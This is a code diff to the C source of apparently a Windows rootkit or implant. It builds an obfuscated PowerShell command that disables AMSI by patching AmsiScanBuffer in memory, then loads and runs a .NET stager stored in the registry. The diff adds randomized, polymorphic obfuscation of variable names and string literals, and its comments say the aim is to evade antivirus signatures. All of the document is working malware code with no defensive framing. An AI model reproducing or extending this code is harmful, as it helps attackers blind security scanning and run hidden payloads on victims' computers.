@@ -58,7 +58,7 @@ LPWSTR GetPowershellCommand(BOOL is64Bit)
 {
 	// Powershell inline command to be invoked using powershell.exe "..."
 
-	PWCHAR command = NEW_ARRAY(WCHAR, 4096);
+	PWCHAR command = NEW_ARRAY(WCHAR, 16384);
 	StrCpyW(command, L"\"");
 
 	// AMSI bypass:
@@ -81,31 +81,31 @@ LPWSTR GetPowershellCommand(BOOL is64Bit)
 			L"[Parameter(Position=1)][Type]$ReturnType"
 			L")"
 			L"$TypeBuilder=[AppDomain]::CurrentDomain"
-			L".DefineDynamicAssembly((New-Object Reflection.AssemblyName('ReflectedDelegate')),[Reflection.Emit.AssemblyBuilderAccess]::Run)"
-			L".DefineDynamicModule('InMe'+'mory'+'Module',$False)"
-			L".DefineType('MyDelegateType','Class,Public,Sealed,AnsiClass,AutoClass',[MulticastDelegate]);"
-			L"$TypeBuilder.DefineConstructor('RTSpecialName,HideBySig,Public',[Reflection.CallingConventions]::Standard,$ParameterTypes).SetImplementationFlags('Runtime,Managed');"
-			L"$TypeBuilder.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$ReturnType,$ParameterTypes).SetImplementationFlags('Runtime,Managed');"
+			L".DefineDynamicAssembly((New-Object Reflection.AssemblyName(`ReflectedDelegate`)),[Reflection.Emit.AssemblyBuilderAccess]::Run)"
+			L".DefineDynamicModule(`InMemoryModule`,$False)"
+			L".DefineType(`MyDelegateType`,`Class,Public,Sealed,AnsiClass,AutoClass`,[MulticastDelegate]);"
+			L"$TypeBuilder.DefineConstructor(`RTSpecialName,HideBySig,Public`,[Reflection.CallingConventions]::Standard,$ParameterTypes).SetImplementationFlags(`Runtime,Managed`);"
+			L"$TypeBuilder.DefineMethod(`Invoke`,`Public,HideBySig,NewSlot,Virtual`,$ReturnType,$ParameterTypes).SetImplementationFlags(`Runtime,Managed`);"
 			L"Write-Output $TypeBuilder.CreateType();"
 			L"}"
 
 			// Use Microsoft.Win32.UnsafeNativeMethods for some DllImport's.
-			L"$NativeMethods=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')})"
-			L".GetType('Microsoft.Win32.'+'Uns'+'afeNat'+'iveMetho'+'ds');"
-			L"$GetProcAddress=$NativeMethods.GetMethod('Ge'+'tPr'+'ocAdd'+'ress',[Reflection.BindingFlags]'Public,Static',$Null,[Reflection.CallingConventions]::Any,@((New-Object IntPtr).GetType(),[string]),$Null);"
+			L"$NativeMethods=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(`System.dll`)})"
+			L".GetType(`Microsoft.Win32.UnsafeNativeMethods`);"
+			L"$GetProcAddress=$NativeMethods.GetMethod(`GetProcAddress`,[Reflection.BindingFlags]`Public,Static`,$Null,[Reflection.CallingConventions]::Any,@((New-Object IntPtr).GetType(),[string]),$Null);"
 
 			// Create delegate types
 			L"$LoadLibraryDelegate=Get-Delegate @([String])([IntPtr]);"
 			L"$VirtualProtectDelegate=Get-Delegate @([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType())([Bool]);"
 
 			// Get DLL and function pointers
-			L"$Kernel32Ptr=$NativeMethods.GetMethod('Get'+'Modu'+'leHan'+'dle').Invoke($Null,@([Object]('kern'+'el'+'32.dll')));"
-			L"$LoadLibraryPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object]('Load'+'LibraryA')));"
-			L"$VirtualProtectPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object]('Vir'+'tual'+'Pro'+'tect')));"
-			L"$AmsiPtr=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryPtr,$LoadLibraryDelegate).Invoke('a'+'m'+'si.dll');"
+			L"$Kernel32Ptr=$NativeMethods.GetMethod(`GetModuleHandle`).Invoke($Null,@([Object](`kernel32.dll`)));"
+			L"$LoadLibraryPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object](`LoadLibraryA`)));"
+			L"$VirtualProtectPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object](`VirtualProtect`)));"
+			L"$AmsiPtr=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryPtr,$LoadLibraryDelegate).Invoke(`amsi.dll`);"
 
 			// Get address of AmsiScanBuffer
-			L"$AmsiScanBufferPtr=$GetProcAddress.Invoke($Null,@([Object]$AmsiPtr,[Object]('Ams'+'iSc'+'an'+'Buffer')));"
+			L"$AmsiScanBufferPtr=$GetProcAddress.Invoke($Null,@([Object]$AmsiPtr,[Object](`AmsiScanBuffer`)));"
 
 			// VirtualProtect PAGE_READWRITE
 			L"$OldProtect=0;"
@@ -137,8 +137,8 @@ LPWSTR GetPowershellCommand(BOOL is64Bit)
 		L"[Reflection.Assembly]::Load"
 		L"("
 		L"[Microsoft.Win32.Registry]::LocalMachine"
-		L".OpenSubkey('SOFTWARE')"
-		L".GetValue('" HIDE_PREFIX L"stager')"
+		L".OpenSubkey(`SOFTWARE`)"
+		L".GetValue(`" HIDE_PREFIX L"stager`)"
 		L")"
 		L".EntryPoint"
 		L".Invoke($Null,$Null)"
@@ -147,33 +147,125 @@ LPWSTR GetPowershellCommand(BOOL is64Bit)
 	StrCatW(command, L"\"");
 
 	// Obfuscate all variable names with random strings.
-	ObfuscateString(command, L"Get-Delegate");
-	ObfuscateString(command, L"ParameterTypes");
-	ObfuscateString(command, L"ReturnType");
-	ObfuscateString(command, L"TypeBuilder");
-	ObfuscateString(command, L"NativeMethods");
-	ObfuscateString(command, L"GetProcAddress");
-	ObfuscateString(command, L"LoadLibraryDelegate");
-	ObfuscateString(command, L"VirtualProtectDelegate");
-	ObfuscateString(command, L"Kernel32Ptr");
-	ObfuscateString(command, L"LoadLibraryPtr");
-	ObfuscateString(command, L"VirtualProtectPtr");
-	ObfuscateString(command, L"AmsiPtr");
-	ObfuscateString(command, L"AmsiScanBufferPtr");
-	ObfuscateString(command, L"OldProtect");
+	ObfuscatePowershellVariable(command, L"Get-Delegate");
+	ObfuscatePowershellVariable(command, L"ParameterTypes");
+	ObfuscatePowershellVariable(command, L"ReturnType");
+	ObfuscatePowershellVariable(command, L"TypeBuilder");
+	ObfuscatePowershellVariable(command, L"NativeMethods");
+	ObfuscatePowershellVariable(command, L"GetProcAddress");
+	ObfuscatePowershellVariable(command, L"LoadLibraryDelegate");
+	ObfuscatePowershellVariable(command, L"VirtualProtectDelegate");
+	ObfuscatePowershellVariable(command, L"Kernel32Ptr");
+	ObfuscatePowershellVariable(command, L"LoadLibraryPtr");
+	ObfuscatePowershellVariable(command, L"VirtualProtectPtr");
+	ObfuscatePowershellVariable(command, L"AmsiPtr");
+	ObfuscatePowershellVariable(command, L"AmsiScanBufferPtr");
+	ObfuscatePowershellVariable(command, L"OldProtect");
+
+	// Replace string literals that are marked with `thestring`.
+	ObfuscatePowershellStringLiterals(command);
 
 	return command;
 }
-VOID ObfuscateString(LPWSTR str, LPCWSTR name)
+VOID ObfuscatePowershellVariable(LPWSTR command, LPCWSTR variableName)
 {
-	DWORD length = lstrlenW(name);
+	DWORD length = lstrlenW(variableName);
 	WCHAR newName[100];
 
+	// Replace all ocurrences of a specified variable name with a randomized string of the same length.
 	if (GetRandomString(newName, length))
 	{
-		for (LPWSTR ocurrence; ocurrence = StrStrIW(str, name);)
+		for (LPWSTR ocurrence; ocurrence = StrStrIW(command, variableName);)
 		{
 			libc_wmemcpy(ocurrence, newName, length);
 		}
 	}
+}
+VOID ObfuscatePowershellStringLiterals(LPWSTR command)
+{
+	// Replace all string literals like
+	// `thestring`
+	// with something like
+	// 't'+[Char]123+[Char]45+'s' ...
+
+	// Polymorphic modifications of strings is required, because something static like
+	// 'ams'+'i.dll'
+	// will eventually end up in a list of known signatures.
+
+	PWCHAR newCommand = NEW_ARRAY(WCHAR, 16384);
+	libc_memset(newCommand, 0, 16384 * sizeof(WCHAR));
+
+	LPBYTE random = NEW_ARRAY(BYTE, 16384);
+	if (!GetRandomBytes(random, 16384)) return;
+
+	LPWSTR commandPtr = command;
+	LPBYTE randomPtr = random;
+
+	for (LPWSTR beginQuote; beginQuote = StrStrIW(commandPtr, L"`");)
+	{
+		LPWSTR endQuote = StrStrIW(&beginQuote[1], L"`");
+		DWORD textLength = beginQuote - commandPtr;
+		DWORD stringLength = endQuote - beginQuote - 1;
+
+		//  beginQuote   endQuote
+		//         |        |
+		//         v        v
+		// .Invoke(`amsi.dll`);
+		// ^------^              <-- textLength
+		//          ^------^     <-- stringLength
+
+		// Append what's before the beginning quote.
+		StrNCatW(newCommand, commandPtr, textLength + 1);
+
+		// Append beginning quote.
+		StrCatW(newCommand, L"'");
+
+		// Append each character using a different obfuscation technique.
+		for (DWORD i = 0; i < stringLength; i++)
+		{
+			WCHAR c = beginQuote[i + 1];
+			WCHAR charNumber[10];
+			libc_ltow(c, charNumber);
+
+			WCHAR obfuscatedChar[20];
+			libc_memset(obfuscatedChar, 0, 20 * sizeof(WCHAR));
+
+			// Randomly choose an obfuscation technique.
+			switch ((*randomPtr++) & 3)
+			{
+				case 0:
+					// Put char as literal
+					obfuscatedChar[0] = c;
+					break;
+				case 1:
+					// Put char as '+'x'+'
+					StrCatW(obfuscatedChar, L"'+'");
+					StrNCatW(obfuscatedChar, &c, 2);
+					StrCatW(obfuscatedChar, L"'+'");
+					break;
+				case 2:
+				case 3:
+					// Put char as '+[Char](123)+'
+					StrCatW(obfuscatedChar, L"'+[Char](");
+					StrCatW(obfuscatedChar, charNumber);
+					StrCatW(obfuscatedChar, L")+'");
+					break;
+			}
+
+			// Append obfuscated version of this char.
+			StrCatW(newCommand, obfuscatedChar);
+		}
+
+		// Append ending quote.
+		StrCatW(newCommand, L"'");
+
+		commandPtr += textLength + stringLength + 2;
+	}
+
+	// Append remaining string after the last quoted string.
+	StrNCatW(newCommand, commandPtr, lstrlenW(command) - (commandPtr - command));
+
+	StrCpyW(command, newCommand);
+	FREE(newCommand);
+	FREE(random);
 }
